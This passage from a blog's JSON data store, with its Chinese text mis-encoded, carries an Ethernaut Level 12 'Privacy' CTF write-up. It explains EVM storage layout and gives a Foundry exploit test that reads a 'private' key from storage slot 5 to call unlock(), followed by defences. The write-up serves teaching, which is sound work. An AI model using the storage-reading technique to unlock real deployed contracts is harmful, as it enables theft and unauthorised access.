éœ€çŸ¥é“å®ç°ç»†èŠ‚å°±å¯ä»¥ä¸å…¶ä»–åˆçº¦äº¤äº’çš„æ–¹å¼</li>\n<li>ä½†æ°¸è¿œä¸è¦ç›²ç›®ç›¸ä¿¡å®ƒä»¬ï¼</li>\n<li>å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°å¯èƒ½äº§ç”Ÿä¸ä¸€è‡´çš„ç»“æœ</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>å®ç°æ¶æ„çš„æ¥å£é€»è¾‘</li>\n<li>åˆ©ç”¨å¤šæ¬¡è°ƒç”¨ä¹‹é—´çš„çŠ¶æ€å˜åŒ–</li>\n<li>æ“çºµå‡½æ•°è¿”å›å€¼ä»¥è¾¾åˆ°æ”»å‡»ç›®çš„</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>åªè°ƒç”¨ä¸€æ¬¡å¤–éƒ¨å‡½æ•°å¹¶ç¼“å­˜ç»“æœ</li>\n<li>ä½¿ç”¨ <code>view</code> å‡½æ•°ä¿®é¥°ç¬¦é˜²æ­¢çŠ¶æ€æ”¹å˜</li>\n<li>å®ç°ç™½åå•æœºåˆ¶æ§åˆ¶è®¿é—®</li>\n<li>å°½å¯èƒ½ä½¿ç”¨å†…éƒ¨é€»è¾‘è€Œä¸ä¾èµ–å¤–éƒ¨å®ç°</li>\n</ul>\n"},{"title":"Ethernaut Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ","date":"2025-01-25T08:00:00.000Z","updated":"2025-01-25T08:00:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥å­¦ä¹  EVM å­˜å‚¨å¸ƒå±€å’Œå¤æ‚æ•°æ®ç»“æ„çš„å­˜å‚¨æœºåˆ¶ï¼ŒæŒæ¡ Privacy å…³å¡çš„æ”»å‡»æŠ€æœ¯ã€‚ç†è§£é™æ€æ•°ç»„ã€æ•°æ®æ‰“åŒ…å’Œå­˜å‚¨æ§½ä½è®¡ç®—ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 12 - Privacy](https://ethernaut.openzeppelin.com/level/12)  \n> **æ”»å‡»ç±»å‹**: å­˜å‚¨å¸ƒå±€åˆ†æ  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¦è¯»å– `private` æ•°æ®ï¼Œç„¶åè°ƒç”¨ `unlock` å‡½æ•°ã€‚è¿™ä¸ªå…³å¡è¿›ä¸€æ­¥è€ƒéªŒå¯¹ EVM å­˜å‚¨å¸ƒå±€çš„ç†è§£ï¼Œç‰¹åˆ«æ˜¯é™æ€æ•°ç»„å’Œæ•°æ®æ‰“åŒ…çš„å¤„ç†ã€‚\n\n![Privacy Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### ç›®æ ‡å‡½æ•°åˆ†æ\n\n```solidity\nfunction unlock(bytes16 _key) public {\n    require(_key == bytes16(data[2]));  // éœ€è¦ data[2] çš„ bytes16 ç‰ˆæœ¬\n    locked = false;\n}\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„çš„æ¡ä»¶æ˜¯ `_key` å¿…é¡»ç­‰äº `bytes16(data[2])`ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è®¿é—® `data[2]` å‘¢ï¼Ÿ\n\n### å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ\n\nåˆçº¦çš„çŠ¶æ€å˜é‡ï¼š\n\n```solidity\nbool public locked = true;\nuint256 public ID = block.timestamp;\nuint8 private flattening = 10;\nuint8 private denomination = 255;\nuint16 private awkwardness = uint16(block.timestamp);\nbytes32[3] private data;\n```\n\nç”±äºæ²¡æœ‰ç»§æ‰¿ï¼Œå­˜å‚¨ä» slot 0 å¼€å§‹ï¼Œå¸¦æœ‰ `locked` å˜é‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n| Slot | Variable | Type | Size | Notes |\n|------|----------|------|------|-------|\n| 0 | `locked` | `bool` | 1 byte | `locked` å ç”¨1ä¸ªå­—èŠ‚ï¼Œä½†ç”±äºä¸‹ä¸€ä¸ªå€¼ä¸é€‚åˆå‰©ä¸‹çš„31ä¸ªå­—èŠ‚ï¼Œ`locked` å ç”¨äº†æ•´ä¸ªæ’æ§½ |\n| 1 | `ID` | `uint256` | 32 bytes | `uint256` å ç”¨32å­—èŠ‚ï¼Œæ‰€ä»¥æ˜¯1ä¸ªæ»¡æ§½ |\n| 2 | `flattening`<br/>`denomination`<br/>`awkwardness` | `uint8`<br/>`uint8`<br/>`uint16` | 1+1+2 bytes | åˆ†åˆ«æ˜¯1ä¸ªå­—èŠ‚+1ä¸ªå­—èŠ‚+2ä¸ªå­—èŠ‚ï¼ŒSolidityå°†å®ƒä»¬æ‰“åŒ…åˆ°ä¸€ä¸ªæ’æ§½ä¸­ |\n| 3 | `data[0]` | `bytes32` | 32 bytes | é™æ€æ•°ç»„å¯åŠ¨ä¸€ä¸ªæ–°çš„å­˜å‚¨æ§½ï¼Œæ¯ä¸ª `bytes32` å…ƒç´ å ç”¨ä¸€ä¸ªå®Œæ•´çš„æ§½ |\n| 4 | `data[1]` | `bytes32` | 32 bytes | |\n| 5 | `data[2]` | `bytes32` | 32 bytes | **è¿™ä¸ªæ§½ä½å°±æ˜¯ `data[2]`** |\n\né€šè¿‡è¿™ä¸ªè¯¦ç»†çš„å­˜å‚¨å¸ƒå±€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° `data[2]` å­˜å‚¨åœ¨ slot 5 ä¸­ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/PrivacyFactory.sol\";\n\ncontract PrivacyTest is Test {\n    Ethernaut ethernaut;\n    PrivacyFactory privacyFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        privacyFactory = new PrivacyFactory();\n        ethernaut.registerLevel(privacyFactory);\n    }\n    \n    function testPrivacyExploit() public {\n        // åˆ›å»ºå…³å¡å®ä¾‹\n        address levelInstance = ethernaut.createLevelInstance(privacyFactory);\n        Privacy instance = Privacy(levelInstance);\n        \n        // éªŒè¯åˆå§‹çŠ¶æ€\n        assertEq(instance.locked(), true);\n        \n        // æ”»å‡»ï¼šè¯»å– slot 5 ä¸­çš„ data[2]\n        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));\n        \n        // è½¬æ¢ä¸º bytes16 å¹¶è§£é”\n        bytes16 key = bytes16(data2);\n        instance.unlock(key);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance.locked(), false);\n        \n        // æäº¤å…³å¡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n    \n    // é¢å¤–æµ‹è¯•ï¼šéªŒè¯å­˜å‚¨å¸ƒå±€\n    function testStorageLayout() public {\n        address levelInstance = ethernaut.createLevelInstance(privacyFactory);\n        \n        // æ£€æŸ¥å„ä¸ª slot çš„å†…å®¹\n        bytes32 slot0 = vm.load(address(levelInstance), bytes32(uint256(0))); // locked\n        bytes32 slot1 = vm.load(address(levelInstance), bytes32(uint256(1))); // ID\n        bytes32 slot2 = vm.load(address(levelInstance), bytes32(uint256(2))); // packed variables\n        bytes32 slot3 = vm.load(address(levelInstance), bytes32(uint256(3))); // data[0]\n        bytes32 slot4 = vm.load(address(levelInstance), bytes32(uint256(4))); // data[1]\n        bytes32 slot5 = vm.load(address(levelInstance), bytes32(uint256(5))); // data[2]\n        \n        console.log(\"Slot 0 (locked):\", uint256(slot0));\n        console.log(\"Slot 1 (ID):\", uint256(slot1));\n        console.log(\"Slot 2 (packed):\");\n        console.logBytes32(slot2);\n        console.log(\"Slot 3 (data[0]):\");\n        console.logBytes32(slot3);\n        console.log(\"Slot 4 (data[1]):\");\n        console.logBytes32(slot4);\n        console.log(\"Slot 5 (data[2]):\");\n        console.logBytes32(slot5);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1. **åˆ†æå­˜å‚¨å¸ƒå±€**ï¼šç¡®å®š `data[2]` å­˜å‚¨åœ¨ slot 5\n2. **è¯»å–å­˜å‚¨**ï¼šä½¿ç”¨ `vm.load()` è¯»å– slot 5 çš„æ•°æ®\n3. **æ•°æ®è½¬æ¢**ï¼šå°† `bytes32` è½¬æ¢ä¸º `bytes16`\n4. **è°ƒç”¨ unlock**ï¼šä½¿ç”¨è½¬æ¢åçš„ key è§£é”åˆçº¦\n\n```solidity\n// è¯»å– slot 5 ä¸­çš„ data[2]\nbytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));\n\n// è½¬æ¢ä¸º bytes16\nbytes16 key = bytes16(data2);  // å–å‰16ä¸ªå­—èŠ‚\n\n// è§£é”åˆçº¦\ninstance.unlock(key);\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\n\n```solidity\n// âŒ ä¸å®‰å…¨ï¼šç§æœ‰æ•°æ®å­˜å‚¨åœ¨é“¾ä¸Š\ncontract VulnerableContract {\n    bytes32[3] private secretData;  // ä»ç„¶å¯ä»¥è¢«è¯»å–ï¼\n    \n    function unlock(bytes16 _key) public {\n        require(_key == bytes16(secretData[2]));\n        // unlock logic\n    }\n}\n\n// âœ… å®‰å…¨ï¼šä½¿ç”¨å“ˆå¸ŒéªŒè¯\ncontract SecureContract {\n    bytes32 private dataHash;  // å­˜å‚¨å“ˆå¸Œè€Œä¸æ˜¯æ˜æ–‡\n    \n    constructor(bytes32 _data) {\n        dataHash = keccak256(abi.encodePacked(_data));\n    }\n    \n    function unlock(bytes32 _data) public {\n        require(keccak256(abi.encodePacked(_data)) == dataHash);\n        // unlock logic\n    }\n}\n```\n\n### 2. ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ\n\n```solidity\ncontract CommitReveal {\n    mapping(address => bytes32) private commitments;\n    mapping(address => bool) private revealed;\n    \n    // ç¬¬ä¸€é˜¶æ®µï¼šæäº¤å“ˆå¸Œ\n    function commit(bytes32 _hashedData) public {\n        commitments[msg.sender] = _hashedData;\n    }\n    \n    // ç¬¬äºŒé˜¶æ®µï¼šæ­ç¤ºå¹¶éªŒè¯\n    function reveal(bytes32 _data, uint256 _nonce) public {\n        bytes32 hash = keccak256(abi.encodePacked(_data, _nonce));\n        require(commitments[msg.sender] == hash, \"Invalid reveal\");\n        revealed[msg.sender] = true;\n    }\n}\n```\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n### å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·\n\n```bash\n# ä½¿ç”¨ forge inspect æŸ¥çœ‹å­˜å‚¨å¸ƒå±€\nforge inspect <ContractName> storage-layout\n\n# ä½¿ç”¨ cast è¯»å–å­˜å‚¨\ncast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>\n\n# ä½¿ç”¨ web3.py è¯»å–å­˜å‚¨\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider('http://localhost:8545'))\ndata = w3.eth.get_storage_at(contract_address, 5)\n```\n\n### æ•°æ®ç±»å‹è½¬æ¢\n\n```solidity\n// bytes32 åˆ° bytes16 è½¬æ¢\nbytes32 fullData = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;\nbytes16 halfData = bytes16(fullData);  // å–å‰16ä¸ªå­—èŠ‚\n\n// æ•°æ®æ‰“åŒ…è§£æ\nbytes32 packedData = 0x000000000000000000000000000a00ff0000000000000000000000000000;\nuint8 flattening = uint8(packedData);           // æœ€å1å­—èŠ‚\nuint8 denomination = uint8(packedData >> 8);    // å€’æ•°2å­—èŠ‚  \nuint16 awkwardness = uint16(packedData >> 16);  // å€’æ•°3-4å­—èŠ‚\n```\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n- åŒæ ·ï¼Œé“¾ä¸Šæ˜¯æ²¡æœ‰éšç§ã€‚ä¸€åˆ‡éƒ½æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥é˜…è¯»\n- åˆç†å®‰æ’ä½ çš„å­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥èŠ‚çœ gas\n- EVM ä½¿ç”¨ 32 å­—èŠ‚çš„å­˜å‚¨æ§½ï¼Œå°äº 32 å­—èŠ‚çš„ç±»å‹ä¼šè¢«æ‰“åŒ…\n\n**æ”»å‡»å‘é‡**:\n- é€šè¿‡å­˜å‚¨å¸ƒå±€åˆ†ææ‰¾åˆ°ç›®æ ‡æ•°æ®çš„ slot ä½ç½®\n- ä½¿ç”¨ RPC è°ƒç”¨æˆ– Foundry cheatcodes è¯»å–æ•°æ®\n- æ­£ç¡®å¤„ç†æ•°æ®ç±»å‹è½¬æ¢å’Œæ•°æ®æ‰“åŒ…\n\n**é˜²å¾¡ç­–ç•¥**:\n- æ°¸è¿œä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ˜æ–‡æ•æ„Ÿæ•°æ®\n- ä½¿ç”¨å“ˆå¸Œã€æ‰¿è¯ºæ–¹æ¡ˆæˆ–é“¾ä¸‹éªŒè¯\n- è€ƒè™‘ä½¿ç”¨åŠ å¯†å­˜å‚¨è§£å†³æ–¹æ¡ˆ\n- åˆç†è®¾è®¡å­˜å‚¨å¸ƒå±€ä»¥æé«˜æ•ˆç‡\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n- [Private data](https://solidity-by-example.org/hacks/accessing-private-data/)\n- [EVM storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)\n- [Storage layout](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)\n\n","source":"_posts/ethernaut-level-12-privacy.md","raw":"---\ntitle: 'Ethernaut Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ'\ndate: 2025-01-25 16:00:00\nupdated: 2025-01-25 16:00:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - å­˜å‚¨å¸ƒå±€åˆ†æ\n  - ç§æœ‰å˜é‡è¯»å–\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\n  - EVMå­˜å‚¨\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥å­¦ä¹  EVM å­˜å‚¨å¸ƒå±€å’Œå¤æ‚æ•°æ®ç»“æ„çš„å­˜å‚¨æœºåˆ¶ï¼ŒæŒæ¡ Privacy å…³å¡çš„æ”»å‡»æŠ€æœ¯ã€‚ç†è§£é™æ€æ•°ç»„ã€æ•°æ®æ‰“åŒ…å’Œå­˜å‚¨æ§½ä½è®¡ç®—ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 12 - Privacy](https://ethernaut.openzeppelin.com/level/12)  \n> **æ”»å‡»ç±»å‹**: å­˜å‚¨å¸ƒå±€åˆ†æ  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¦è¯»å– `private` æ•°æ®ï¼Œç„¶åè°ƒç”¨ `unlock` å‡½æ•°ã€‚è¿™ä¸ªå…³å¡è¿›ä¸€æ­¥è€ƒéªŒå¯¹ EVM å­˜å‚¨å¸ƒå±€çš„ç†è§£ï¼Œç‰¹åˆ«æ˜¯é™æ€æ•°ç»„å’Œæ•°æ®æ‰“åŒ…çš„å¤„ç†ã€‚\n\n![Privacy Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### ç›®æ ‡å‡½æ•°åˆ†æ\n\n```solidity\nfunction unlock(bytes16 _key) public {\n    require(_key == bytes16(data[2]));  // éœ€è¦ data[2] çš„ bytes16 ç‰ˆæœ¬\n    locked = false;\n}\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„çš„æ¡ä»¶æ˜¯ `_key` å¿…é¡»ç­‰äº `bytes16(data[2])`ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è®¿é—® `data[2]` å‘¢ï¼Ÿ\n\n### å¤æ‚å­˜å‚¨å¸ƒå±€åˆ†æ\n\nåˆçº¦çš„çŠ¶æ€å˜é‡ï¼š\n\n```solidity\nbool public locked = true;\nuint256 public ID = block.timestamp;\nuint8 private flattening = 10;\nuint8 private denomination = 255;\nuint16 private awkwardness = uint16(block.timestamp);\nbytes32[3] private data;\n```\n\nç”±äºæ²¡æœ‰ç»§æ‰¿ï¼Œå­˜å‚¨ä» slot 0 å¼€å§‹ï¼Œå¸¦æœ‰ `locked` å˜é‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n| Slot | Variable | Type | Size | Notes |\n|------|----------|------|------|-------|\n| 0 | `locked` | `bool` | 1 byte | `locked` å ç”¨1ä¸ªå­—èŠ‚ï¼Œä½†ç”±äºä¸‹ä¸€ä¸ªå€¼ä¸é€‚åˆå‰©ä¸‹çš„31ä¸ªå­—èŠ‚ï¼Œ`locked` å ç”¨äº†æ•´ä¸ªæ’æ§½ |\n| 1 | `ID` | `uint256` | 32 bytes | `uint256` å ç”¨32å­—èŠ‚ï¼Œæ‰€ä»¥æ˜¯1ä¸ªæ»¡æ§½ |\n| 2 | `flattening`<br/>`denomination`<br/>`awkwardness` | `uint8`<br/>`uint8`<br/>`uint16` | 1+1+2 bytes | åˆ†åˆ«æ˜¯1ä¸ªå­—èŠ‚+1ä¸ªå­—èŠ‚+2ä¸ªå­—èŠ‚ï¼ŒSolidityå°†å®ƒä»¬æ‰“åŒ…åˆ°ä¸€ä¸ªæ’æ§½ä¸­ |\n| 3 | `data[0]` | `bytes32` | 32 bytes | é™æ€æ•°ç»„å¯åŠ¨ä¸€ä¸ªæ–°çš„å­˜å‚¨æ§½ï¼Œæ¯ä¸ª `bytes32` å…ƒç´ å ç”¨ä¸€ä¸ªå®Œæ•´çš„æ§½ |\n| 4 | `data[1]` | `bytes32` | 32 bytes | |\n| 5 | `data[2]` | `bytes32` | 32 bytes | **è¿™ä¸ªæ§½ä½å°±æ˜¯ `data[2]`** |\n\né€šè¿‡è¿™ä¸ªè¯¦ç»†çš„å­˜å‚¨å¸ƒå±€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° `data[2]` å­˜å‚¨åœ¨ slot 5 ä¸­ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/PrivacyFactory.sol\";\n\ncontract PrivacyTest is Test {\n    Ethernaut ethernaut;\n    PrivacyFactory privacyFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        privacyFactory = new PrivacyFactory();\n        ethernaut.registerLevel(privacyFactory);\n    }\n    \n    function testPrivacyExploit() public {\n        // åˆ›å»ºå…³å¡å®ä¾‹\n        address levelInstance = ethernaut.createLevelInstance(privacyFactory);\n        Privacy instance = Privacy(levelInstance);\n        \n        // éªŒè¯åˆå§‹çŠ¶æ€\n        assertEq(instance.locked(), true);\n        \n        // æ”»å‡»ï¼šè¯»å– slot 5 ä¸­çš„ data[2]\n        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));\n        \n        // è½¬æ¢ä¸º bytes16 å¹¶è§£é”\n        bytes16 key = bytes16(data2);\n        instance.unlock(key);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance.locked(), false);\n        \n        // æäº¤å…³å¡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n    \n    // é¢å¤–æµ‹è¯•ï¼šéªŒè¯å­˜å‚¨å¸ƒå±€\n    function testStorageLayout() public {\n        address levelInstance = ethernaut.createLevelInstance(privacyFactory);\n        \n        // æ£€æŸ¥å„ä¸ª slot çš„å†…å®¹\n        bytes32 slot0 = vm.load(address(levelInstance), bytes32(uint256(0))); // locked\n        bytes32 slot1 = vm.load(address(levelInstance), bytes32(uint256(1))); // ID\n        bytes32 slot2 = vm.load(address(levelInstance), bytes32(uint256(2))); // packed variables\n        bytes32 slot3 = vm.load(address(levelInstance), bytes32(uint256(3))); // data[0]\n        bytes32 slot4 = vm.load(address(levelInstance), bytes32(uint256(4))); // data[1]\n        bytes32 slot5 = vm.load(address(levelInstance), bytes32(uint256(5))); // data[2]\n        \n        console.log(\"Slot 0 (locked):\", uint256(slot0));\n        console.log(\"Slot 1 (ID):\", uint256(slot1));\n        console.log(\"Slot 2 (packed):\");\n        console.logBytes32(slot2);\n        console.log(\"Slot 3 (data[0]):\");\n        console.logBytes32(slot3);\n        console.log(\"Slot 4 (data[1]):\");\n        console.logBytes32(slot4);\n        console.log(\"Slot 5 (data[2]):\");\n        console.logBytes32(slot5);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1. **åˆ†æå­˜å‚¨å¸ƒå±€**ï¼šç¡®å®š `data[2]` å­˜å‚¨åœ¨ slot 5\n2. **è¯»å–å­˜å‚¨**ï¼šä½¿ç”¨ `vm.load()` è¯»å– slot 5 çš„æ•°æ®\n3. **æ•°æ®è½¬æ¢**ï¼šå°† `bytes32` è½¬æ¢ä¸º `bytes16`\n4. **è°ƒç”¨ unlock**ï¼šä½¿ç”¨è½¬æ¢åçš„ key è§£é”åˆçº¦\n\n```solidity\n// è¯»å– slot 5 ä¸­çš„ data[2]\nbytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));\n\n// è½¬æ¢ä¸º bytes16\nbytes16 key = bytes16(data2);  // å–å‰16ä¸ªå­—èŠ‚\n\n// è§£é”åˆçº¦\ninstance.unlock(key);\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\n\n```solidity\n// âŒ ä¸å®‰å…¨ï¼šç§æœ‰æ•°æ®å­˜å‚¨åœ¨é“¾ä¸Š\ncontract VulnerableContract {\n    bytes32[3] private secretData;  // ä»ç„¶å¯ä»¥è¢«è¯»å–ï¼\n    \n    function unlock(bytes16 _key) public {\n        require(_key == bytes16(secretData[2]));\n        // unlock logic\n    }\n}\n\n// âœ… å®‰å…¨ï¼šä½¿ç”¨å“ˆå¸ŒéªŒè¯\ncontract SecureContract {\n    bytes32 private dataHash;  // å­˜å‚¨å“ˆå¸Œè€Œä¸æ˜¯æ˜æ–‡\n    \n    constructor(bytes32 _data) {\n        dataHash = keccak256(abi.encodePacked(_data));\n    }\n    \n    function unlock(bytes32 _data) public {\n        require(keccak256(abi.encodePacked(_data)) == dataHash);\n        // unlock logic\n    }\n}\n```\n\n### 2. ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ\n\n```solidity\ncontract CommitReveal {\n    mapping(address => bytes32) private commitments;\n    mapping(address => bool) private revealed;\n    \n    // ç¬¬ä¸€é˜¶æ®µï¼šæäº¤å“ˆå¸Œ\n    function commit(bytes32 _hashedData) public {\n        commitments[msg.sender] = _hashedData;\n    }\n    \n    // ç¬¬äºŒé˜¶æ®µï¼šæ­ç¤ºå¹¶éªŒè¯\n    function reveal(bytes32 _data, uint256 _nonce) public {\n        bytes32 hash = keccak256(abi.encodePacked(_data, _nonce));\n        require(commitments[msg.sender] == hash, \"Invalid reveal\");\n        revealed[msg.sender] = true;\n    }\n}\n```\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n### å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·\n\n```bash\n# ä½¿ç”¨ forge inspect æŸ¥çœ‹å­˜å‚¨å¸ƒå±€\nforge inspect <ContractName> storage-layout\n\n# ä½¿ç”¨ cast è¯»å–å­˜å‚¨\ncast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>\n\n# ä½¿ç”¨ web3.py è¯»å–å­˜å‚¨\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider('http://localhost:8545'))\ndata = w3.eth.get_storage_at(contract_address, 5)\n```\n\n### æ•°æ®ç±»å‹è½¬æ¢\n\n```solidity\n// bytes32 åˆ° bytes16 è½¬æ¢\nbytes32 fullData = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;\nbytes16 halfData = bytes16(fullData);  // å–å‰16ä¸ªå­—èŠ‚\n\n// æ•°æ®æ‰“åŒ…è§£æ\nbytes32 packedData = 0x000000000000000000000000000a00ff0000000000000000000000000000;\nuint8 flattening = uint8(packedData);           // æœ€å1å­—èŠ‚\nuint8 denomination = uint8(packedData >> 8);    // å€’æ•°2å­—èŠ‚  \nuint16 awkwardness = uint16(packedData >> 16);  // å€’æ•°3-4å­—èŠ‚\n```\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n- åŒæ ·ï¼Œé“¾ä¸Šæ˜¯æ²¡æœ‰éšç§ã€‚ä¸€åˆ‡éƒ½æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥é˜…è¯»\n- åˆç†å®‰æ’ä½ çš„å­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥èŠ‚çœ gas\n- EVM ä½¿ç”¨ 32 å­—èŠ‚çš„å­˜å‚¨æ§½ï¼Œå°äº 32 å­—èŠ‚çš„ç±»å‹ä¼šè¢«æ‰“åŒ…\n\n**æ”»å‡»å‘é‡**:\n- é€šè¿‡å­˜å‚¨å¸ƒå±€åˆ†ææ‰¾åˆ°ç›®æ ‡æ•°æ®çš„ slot ä½ç½®\n- ä½¿ç”¨ RPC è°ƒç”¨æˆ– Foundry cheatcodes è¯»å–æ•°æ®\n- æ­£ç¡®å¤„ç†æ•°æ®ç±»å‹è½¬æ¢å’Œæ•°æ®æ‰“åŒ…\n\n**é˜²å¾¡ç­–ç•¥**:\n- æ°¸è¿œä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ˜æ–‡æ•æ„Ÿæ•°æ®\n- ä½¿ç”¨å“ˆå¸Œã€æ‰¿è¯ºæ–¹æ¡ˆæˆ–é“¾ä¸‹éªŒè¯\n- è€ƒè™‘ä½¿ç”¨åŠ å¯†å­˜å‚¨è§£å†³æ–¹æ¡ˆ\n- åˆç†è®¾è®¡å­˜å‚¨å¸ƒå±€ä»¥æé«˜æ•ˆç‡\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n- [Private data](https://solidity-by-example.org/hacks/accessing-private-data/)\n- [EVM storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)\n- [Storage layout](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)\n\n","slug":"ethernaut-level-12-privacy","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpb000zbf5qahyqe0h8","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-12-Privacy-å­˜å‚¨å¸ƒå±€åˆ†æ\"><a href=\"#ğŸ¯-Ethernaut-Level-12-Privacy-å­˜å‚¨å¸ƒå±€åˆ†æ\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ\"></a>ğŸ¯ Ethernaut Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/12\">Ethernaut Level 12 - Privacy</a><br><strong>æ”»å‡»ç±»å‹</strong>: å­˜å‚¨å¸ƒå±€åˆ†æ<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¦è¯»å– <code>private</code> æ•°æ®ï¼Œç„¶åè°ƒç”¨ <code>unlock</code> å‡½æ•°ã€‚è¿™ä¸ªå…³å¡è¿›ä¸€æ­¥è€ƒéªŒå¯¹ EVM å­˜å‚¨å¸ƒå±€çš„ç†è§£ï¼Œç‰¹åˆ«æ˜¯é™æ€æ•°ç»„å’Œæ•°æ®æ‰“åŒ…çš„å¤„ç†ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg\" alt=\"Privacy Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" 